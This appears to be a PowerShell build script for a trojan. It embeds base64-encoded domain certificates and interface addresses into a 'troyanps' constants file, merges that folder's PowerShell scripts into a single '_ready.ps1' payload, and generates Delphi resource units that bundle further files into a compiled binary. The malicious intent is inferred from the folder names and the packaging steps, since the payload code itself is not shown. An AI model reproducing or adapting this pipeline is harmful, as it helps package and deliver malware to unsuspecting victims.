#init
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$commonPath = Join-Path -Path $scriptDir -ChildPath "..\common.ps1"
$commonOutput = & $commonPath
$domainArray = $commonOutput.domainArray
$publicInterface = $commonOutput.publicInterface
$secondInterface = $commonOutput.secondInterface
$valid = $commonOutput.valid;
if (-not $valid) {
    Write-Host "Exiting precompile.ps1 script with an error." -ForegroundColor Red
    throw "An error occurred."
}

#certs
$template = @"
`$PrimaryDNSServer = '1.1.1.1'
`$SecondaryDNSServer = '2.2.2.2'
`$xdata = @{
    JOPA
}
"@
$stringList = @()
foreach ($domain in $domainArray) {
    if (-not [string]::IsNullOrWhiteSpace($domain)) 
    {
        $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\cert\$domain.pfx"
        $pathPfx = (Resolve-Path -Path $pathPfx).Path
        $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
        $base64 = [Convert]::ToBase64String($binaryData)
        $chunkSize = 200
        $chunks = @()
        for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
            $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
            $chunks += $chunk
        }
        $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
        $stringList += "'" + $domain + "'=" + $code
    }
}
$listString = $stringList -join [System.Environment]::NewLine
$template = $template -replace "1\.1\.1\.1", $publicInterface
$template = $template -replace "2\.2\.2\.2", $secondInterface
$template  = $template -replace "JOPA", $listString
$troyan = Join-Path -Path $scriptDir -ChildPath '..\troyanps\consts.ps1'
$troyan = (Resolve-Path -Path $troyan).Path
$template | Set-Content -Path $troyan


#join
$sourceDir = Join-Path -Path $scriptDir -ChildPath "..\troyanps"
$destinationFile = Join-Path -Path $scriptDir -ChildPath "_ready.ps1"
$ps1Files = Get-ChildItem -Path $sourceDir -Filter "*.ps1"
$joinedContent = ""
foreach ($file in $ps1Files) {
    $fileContent = Get-Content -Path $file.FullName -Raw
    $joinedContent += $fileContent + [System.Environment]::NewLine
}
$joinedContent | Set-Content -Path $destinationFile -Encoding UTF8

#compile manifest
$manifestFile = Join-Path -Path $scriptDir -ChildPath "dns.manifest.rc"
& "C:\Program Files (x86)\Borland\Delphi7\Bin\brcc32.exe" "$manifestFile"


#delphi embeddings
function Create-EmbeddingFiles {
    param (
        [string]$name,
        [int]$startIndex
    )

    $rcFile = Join-Path -Path $scriptDir -ChildPath "_$name.rc"
    $delphiFile = Join-Path -Path $scriptDir -ChildPath "_$name.pas"
    $unitName = "_$name";
    $srcFolder = Join-Path -Path $scriptDir -ChildPath "..\\$name"


    $files = (Get-ChildItem -Path $srcFolder -File) 
    if ($null -eq $files){
        $files = @()
    }
    if (-not ($files.GetType().Name -eq 'Object[]')) {
        $files = @($files)
    }
    
    $idx=$startIndex;
    $rcContent = ""
    $delphiArray = @()
    foreach ($file in $files) {
        $filename = [System.IO.Path]::GetFileName($file.FullName)
        $rcContent = $rcContent + "$idx RCDATA ""..\$name\$filename"""+ [System.Environment]::NewLine
        $idx++
        $delphiArray += "'" + $filename + "'"
    }

    $template = @"
unit NAME;

interface

const
xembeddings: array[0..NUMBER] of string = (CONTENT);

implementation

end.
"@
    Set-Content -Path $rcFile -Value $rcContent -Encoding UTF8NoBOM

    & "C:\Program Files (x86)\Borland\Delphi7\Bin\brcc32.exe" "$rcFile"

    $template  = $template -replace "CONTENT", ($delphiArray -join ', ')
    $template  = $template -replace "NAME", $unitName
    $template  = $template -replace "NUMBER", ($files.Length-1).ToString()

    Set-Content -Path $delphiFile -Value $template -Encoding UTF8NoBOM
}

Create-EmbeddingFiles -name "front" -startIndex 8000
Create-EmbeddingFiles -name "embeddings" -startIndex 9000
